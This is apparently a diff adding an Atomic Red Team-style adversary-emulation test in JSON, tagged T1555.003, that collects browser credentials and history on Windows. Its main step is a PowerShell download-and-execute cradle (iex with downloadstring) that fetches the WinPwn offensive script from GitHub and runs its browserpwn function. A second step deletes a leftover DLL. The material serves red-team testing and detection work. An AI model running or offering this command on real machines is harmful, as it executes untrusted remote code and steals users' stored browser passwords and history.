@@ -1,0 +1,44 @@
+{
+  "id": "764ea176-fb71-494c-90ea-72e9d85dce76",
+  "name": "WinPwn - BrowserPwn",
+  "description": "Collect Browser credentials as well as the history via winpwn browserpwn function of WinPwn.",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "6a052f72-3219-46ad-a5b7-e39c096a20c4",
+      "type": "execute-command",
+      "data": {
+        "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nbrowserpwn -consoleoutput -noninteractive",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "5b1a8394-aa81-4811-b4e7-058913da28af",
+      "type": "execute-command",
+      "data": {
+        "command": "rm .\\System.Data.SQLite.dll -ErrorAction Ignore",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "6a052f72-3219-46ad-a5b7-e39c096a20c4",
+      "p": "on-success",
+      "o": "5b1a8394-aa81-4811-b4e7-058913da28af"
+    },
+    {
+      "s": "6a052f72-3219-46ad-a5b7-e39c096a20c4",
+      "p": "on-failure",
+      "o": "5b1a8394-aa81-4811-b4e7-058913da28af"
+    }
+  ],
+  "tags": [
+    "T1555.003",
+    "atomic-red-team"
+  ]
+}
